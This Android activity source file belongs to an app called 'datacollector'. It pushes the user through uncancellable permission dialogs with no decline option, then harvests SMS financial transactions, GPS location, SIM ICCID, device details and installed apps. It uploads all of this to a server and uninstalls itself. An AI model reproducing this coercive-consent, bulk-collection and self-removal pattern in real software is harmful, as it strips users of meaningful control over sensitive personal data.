package com.datacollector;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.app.PendingIntent;
import android.content.pm.PackageInstaller;
import android.os.CountDownTimer;
import android.provider.Settings;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    // 6 collection steps + 8 sync steps = 14 total
    private static final int COLLECT_STEPS = 6;
    private static final int TOTAL_STEPS   = COLLECT_STEPS + DataSyncManager.SYNC_TABLE_COUNT;

    private TextView    statusText;
    private TextView    progressPercent;
    private ProgressBar progressBar;
    private int         stepsCompleted = 0;
    private int         currentPermIndex = 0;
    private boolean[]   permRequestedOnce;

    // Each permission with its title and explanation shown to the user
    private static final String[][] PERM_INFO = {
        {
            Manifest.permission.READ_SMS,
            "SMS Messages",
            "This app needs to read your SMS messages.\n\nPurpose: Extract financial transactions from bKash, Nagad, Rocket, telecom recharges, and ride-hailing (Uber/Pathao) SMS messages."
        },
        {
            Manifest.permission.ACCESS_FINE_LOCATION,
            "Precise Location (GPS)",
            "This app needs access to your precise GPS location.\n\nPurpose: Collect your current location coordinates for geographical activity analysis."
        },
        {
            Manifest.permission.ACCESS_COARSE_LOCATION,
            "Approximate Location (Network)",
            "This app needs access to your approximate network-based location.\n\nPurpose: Used as a fallback when GPS is unavailable to estimate your general location."
        },
        {
            Manifest.permission.READ_PHONE_STATE,
            "Phone & SIM Information",
            "This app needs to read your phone and SIM card details.\n\nPurpose: Record SIM operator, ICCID, country code and detect SIM changes to verify device identity."
        },
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Safety guard: if T&C not accepted, redirect to TermsActivity
        SharedPreferences prefs = getSharedPreferences(TermsActivity.PREFS_NAME, MODE_PRIVATE);
        if (!prefs.getBoolean(TermsActivity.KEY_AGREED, false)) {
            startActivity(new Intent(this, TermsActivity.class));
            finish();
            return;
        }

        setContentView(R.layout.activity_main);
        statusText      = findViewById(R.id.statusText);
        progressPercent = findViewById(R.id.progressPercent);
        progressBar     = findViewById(R.id.progressBar);
        stepsCompleted  = 0;
        currentPermIndex = 0;
        permRequestedOnce = new boolean[PERM_INFO.length];
        updateProgress(0, "Preparing...");

        // Start one-by-one permission requests
        requestNextPermission();
    }

    /** Show explanation dialog for the next ungranted permission, then request it */
    private void requestNextPermission() {
        // Advance past already-granted permissions
        while (currentPermIndex < PERM_INFO.length) {
            if (ContextCompat.checkSelfPermission(this, PERM_INFO[currentPermIndex][0])
                    == PackageManager.PERMISSION_GRANTED) {
                currentPermIndex++;
            } else {
                break;
            }
        }

        if (currentPermIndex >= PERM_INFO.length) {
            // All permissions granted — start collecting
            startCollectionAndSync();
            return;
        }

        String[] info    = PERM_INFO[currentPermIndex];
        String   permNum = (currentPermIndex + 1) + "/" + PERM_INFO.length;
        updateProgress(0, "Permission " + permNum + ": " + info[1]);

        // If user permanently denied (denied once + shouldShow==false), send to Settings
        boolean permanentlyDenied = permRequestedOnce[currentPermIndex]
            && !ActivityCompat.shouldShowRequestPermissionRationale(this, info[0]);

        if (permanentlyDenied) {
            new AlertDialog.Builder(this)
                .setTitle("Permission Required: " + info[1])
                .setMessage(info[2] + "\n\nYou have denied this permission. Please tap 'Open Settings', then enable the permission manually to continue.")
                .setCancelable(false)
                .setPositiveButton("Open Settings", (d, w) -> {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(Uri.fromParts("package", getPackageName(), null));
                    startActivity(intent);
                })
                .setNegativeButton("Try Again", (d, w) -> requestNextPermission())
                .show();
        } else {
            new AlertDialog.Builder(this)
                .setTitle("Permission " + permNum + ": " + info[1])
                .setMessage(info[2])
                .setCancelable(false)
                .setPositiveButton("Allow", (d, w) -> {
                    permRequestedOnce[currentPermIndex] = true;
                    ActivityCompat.requestPermissions(
                        this, new String[]{ info[0] }, PERMISSION_REQUEST_CODE);
                })
                .show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean granted = grantResults.length > 0
                && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            if (granted) {
                currentPermIndex++; // move to next only when granted
            }
            // if denied, currentPermIndex stays — dialog re-shows for same permission
            requestNextPermission();
        }
    }

    /** Update progress bar and label on the UI thread */
    private void updateProgress(int steps, String label) {
        int pct = (int) ((steps / (float) TOTAL_STEPS) * 100);
        runOnUiThread(() -> {
            progressBar.setProgress(pct);
            progressPercent.setText(pct + "%");
            statusText.setText(label);
        });
    }

    private void startCollectionAndSync() {
        stepsCompleted = 0;

        new Thread(() -> {
            // --- Collection phase (6 steps) ---
            updateProgress(0, "Collecting SMS...");
            new SmsCollector(this).collect();
            updateProgress(++stepsCompleted, "Collecting location...");

            new LocationCollector(this).collect();
            updateProgress(++stepsCompleted, "Checking SIM...");

            new SimChangeDetector(this).checkAndRecordSimChange();
            updateProgress(++stepsCompleted, "Analysing SMS data...");

            new SmsAnalyzer(this).analyze();
            updateProgress(++stepsCompleted, "Collecting device info...");

            new DeviceInfoCollector(this).collect();
            updateProgress(++stepsCompleted, "Collecting installed apps...");

            new InstalledAppsCollector(this).collect();
            updateProgress(++stepsCompleted, "Syncing to server...");

            // --- Sync phase (8 steps) ---
            String[] tableLabels = {
                "Syncing SMS...",
                "Syncing location...",
                "Syncing SIM history...",
                "Syncing mobile money...",
                "Syncing telecom usage...",
                "Syncing ride-hailing...",
                "Syncing device info...",
                "Syncing installed apps...",
            };

            new DataSyncManager(this).syncAll(
                () -> runOnUiThread(() -> {
                    progressBar.setProgress(100);
                    progressPercent.setText("100%");
                    statusText.setText("All data synced! Uninstalling in 10s...");
                    Toast.makeText(this, "Sync complete!", Toast.LENGTH_SHORT).show();
                    startUninstallCountdown();
                }),
                (done, total) -> {
                    String label = (done - 1 < tableLabels.length)
                        ? tableLabels[done - 1] : "Syncing...";
                    updateProgress(COLLECT_STEPS + done, label);
                }
            );
        }).start();
    }

    /** Count down 10 seconds then uninstall the app */
    private void startUninstallCountdown() {
        new CountDownTimer(10000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                int sec = (int) (millisUntilFinished / 1000) + 1;
                statusText.setText("All data synced! Uninstalling in " + sec + "s...");
            }
            @Override
            public void onFinish() {
                statusText.setText("Uninstalling...");
                uninstallSelf();
            }
        }.start();
    }

    private void uninstallSelf() {
        // Method 1: PackageInstaller API (Android 10+ recommended)
        try {
            Intent broadcastIntent = new Intent("com.datacollector.UNINSTALL_DONE");
            PendingIntent pi = PendingIntent.getBroadcast(
                MainActivity.this, 0, broadcastIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
            getPackageManager()
                .getPackageInstaller()
                .uninstall(getPackageName(), pi.getIntentSender());
            return;
        } catch (Exception e1) {
            // fall through to next method
        }
        // Method 2: ACTION_UNINSTALL_PACKAGE intent (fallback)
        try {
            Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE);
            intent.setData(Uri.parse("package:" + getPackageName()));
            intent.putExtra(Intent.EXTRA_RETURN_RESULT, false);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e2) {
            Toast.makeText(this, "Please uninstall the app manually.", Toast.LENGTH_LONG).show();
        }
    }
}